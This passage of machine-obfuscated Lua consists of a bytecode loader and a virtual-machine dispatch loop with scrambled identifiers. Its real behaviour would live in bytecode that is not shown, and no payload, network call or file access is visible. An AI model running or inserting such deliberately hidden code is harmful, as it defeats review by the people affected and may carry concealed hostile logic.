snap_llIIlIlIlIllIlIl[3]=snap_llIIlIIlIlIllIl();elseif(snap_IlIlIIlIlIllIllIl==2)then snap_llIIlIlIlIllIlIl[3]=snap_llIIlIIlIlIllIl()-(2^16)elseif(snap_IlIlIIlIlIllIllIl==3)then snap_llIIlIlIlIllIlIl[3]=snap_llIIlIIlIlIllIl()-(2^16)snap_llIIlIlIlIllIlIl[4]=snap_IIIlllIIIIIlIllllII();end;if(snap_lIllIlIIIllIIIllIlIlllIlI(snap_lIIlIIIllIIlIIIlI,1,1)==1)then snap_llIIlIlIlIllIlIl[2]=snap_IIllIlIllIIlIlIIII[snap_llIIlIlIlIllIlIl[2]]end if(snap_lIllIlIIIllIIIllIlIlllIlI(snap_lIIlIIIllIIlIIIlI,2,2)==1)then snap_llIIlIlIlIllIlIl[3]=snap_IIllIlIllIIlIlIIII[snap_llIIlIlIlIllIlIl[3]]end if(snap_lIllIlIIIllIIIllIlIlllIlI(snap_lIIlIIIllIIlIIIlI,3,3)==1)then snap_llIIlIlIlIllIlIl[4]=snap_IIllIlIllIIlIlIIII[snap_llIIlIlIlIllIlIl[4]]end snap_lIlIlIIIIIlIIlIlllI[snap_lllIllIIlIIIIlIllIlllIlI]=snap_llIIlIlIlIllIlIl;end end;for snap_llIIlIlIlIllIlIl=1,snap_llIIlIIlIlIllIl()do snap_IIIIlllIllllIIIIIlIll[snap_llIIlIlIlIllIlIl-1]=snap_IIIllIIIlllIIlIlll();end;return snap_lllIllIIlIIIIlIllIlllIlI;end;local function snap_IlllllIlIIIIIIIlll(snap_llIIlIlIlIllIlIl,snap_llIIlIIlIlIllIl,snap_IIIlllIIIIIlIllllII)snap_llIIlIlIlIllIlIl=(snap_llIIlIlIlIllIlIl==true and snap_IIIllIIIlllIIlIlll())or snap_llIIlIlIlIllIlIl;return(function(...)local snap_IlIlIIlIlIllIllIl=snap_llIIlIlIlIllIlIl[1];local snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[3];local snap_IlIllIlllIIllI=snap_llIIlIlIlIllIlIl[2];local snap_IIIIlllIllllIIIIIlIll=snap_llIlllIllIlIIIIlllIIl local snap_llIIlIIlIlIllIl=1;local snap_IIIllIIIlllIIlIlll=-1;local snap_llllllllIIllllIlI={};local snap_lIIlIIIllIIlIIIlI={...};local snap_lIlIlIIIIIlIIlIlllI=snap_IlIllIllIIlll('#',...)-1;local snap_llIIlIlIlIllIlIl={};local snap_lIllIlIIIllIIIllIlIlllIlI={};for snap_llIIlIlIlIllIlIl=0,snap_lIlIlIIIIIlIIlIlllI do if(snap_llIIlIlIlIllIlIl>=snap_IIllIlIllIIlIlIIII)then snap_llllllllIIllllIlI[snap_llIIlIlIlIllIlIl-snap_IIllIlIllIIlIlIIII]=snap_lIIlIIIllIIlIIIlI[snap_llIIlIlIlIllIlIl+1];else snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl]=snap_lIIlIIIllIIlIIIlI[snap_llIIlIlIlIllIlIl+#{{241;568;64;9};}];end;end;local snap_llIIlIlIlIllIlIl=snap_lIlIlIIIIIlIIlIlllI-snap_IIllIlIllIIlIlIIII+1 local snap_llIIlIlIlIllIlIl;local snap_lIIlIIIllIIlIIIlI;while true do snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIIlIIIllIIlIIIlI=snap_llIIlIlIlIllIlIl[1];if snap_lIIlIIIllIIlIIIlI<=17 then if snap_lIIlIIIllIIlIIIlI<=8 then if snap_lIIlIIIllIIlIIIlI<=3 then if snap_lIIlIIIllIIlIIIlI<=1 then if snap_lIIlIIIllIIlIIIlI==0 then local snap_IIllIlIllIIlIlIIII;snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII+1])snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII+1])else local snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_llIIlIlIlIllIlIl+1,snap_IIIllIIIlllIIlIlll))end;elseif snap_lIIlIIIllIIlIIIlI>2 then local snap_llIIlIIlIlIllIl=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIIlIlIllIl]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIIlIlIllIl](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_llIIlIIlIlIllIl+1,snap_llIIlIlIlIllIlIl[3]))else local snap_IIllIlIllIIlIlIIII;snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII+1])snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];end;elseif snap_lIIlIIIllIIlIIIlI<=5 then if snap_lIIlIIIllIIlIIIlI==4 then local snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_llIIlIlIlIllIlIl+1,snap_IIIllIIIlllIIlIlll))else local snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl]()end;elseif snap_lIIlIIIllIIlIIIlI<=6 then snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];elseif snap_lIIlIIIllIIlIIIlI==7 then local snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl](snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl+1])else local snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl](snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl+1])end;elseif snap_lIIlIIIllIIlIIIlI<=12 then if snap_lIIlIIIllIIlIIIlI<=10 then if snap_lIIlIIIllIIlIIIlI==9 then snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IlllllIlIIIIIIIlll(snap_IlIllIlllIIllI[snap_llIIlIlIlIllIlIl[3]],nil,snap_IIIlllIIIIIlIllllII);else local snap_llIIlIIlIlIllIl=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIIlIlIllIl]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIIlIlIllIl](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_llIIlIIlIlIllIl+1,snap_llIIlIlIlIllIlIl[3]))end;elseif snap_lIIlIIIllIIlIIIlI==11 then snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];else do return end;end;elseif snap_lIIlIIIllIIlIIIlI<=14 then if snap_lIIlIIIllIIlIIIlI==13 then snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];else snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];end;elseif snap_lIIlIIIllIIlIIIlI<=15 then snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];elseif snap_lIIlIIIllIIlIIIlI==16 then local snap_lIIlIIIllIIlIIIlI;local snap_IIllIlIllIIlIlIIII;snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII+1])snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2];snap_lIIlIIIllIIlIIIlI=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]];snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII+1]=snap_lIIlIIIllIIlIIIlI;snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIIlIIIllIIlIIIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII+1])snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_llIIlIlIlIllIlIl[4];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl